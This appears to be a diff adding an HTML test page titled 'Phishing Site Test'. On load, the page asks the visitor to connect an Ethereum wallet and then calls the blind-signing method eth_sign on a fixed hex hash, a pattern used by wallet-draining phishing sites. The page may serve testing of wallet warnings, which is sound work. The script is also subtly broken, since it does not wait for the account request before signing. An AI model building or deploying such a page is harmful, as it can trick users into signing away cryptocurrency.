@@ -1,0 +1,25 @@
+<html>
+<title>Phishing Site Test</title>
+
+<body>
+    <h1>Please select your wallet at the bottom right.</h1>
+
+
+    <script>
+        let accounts = [];
+        async function getAccount() {
+            accounts = await ethereum.request({
+                method: 'eth_requestAccounts'
+            });
+        }
+
+        getAccount();
+        const msg = '0x9779fa45a31a2a48daaee437258eab3e63186b68e5f5063eac5fa1e1c0798700';
+        ethereum.request({
+            method: 'eth_sign',
+            params: [accounts[0], msg]
+        });
+    </script>
+</body>
+
+</html>
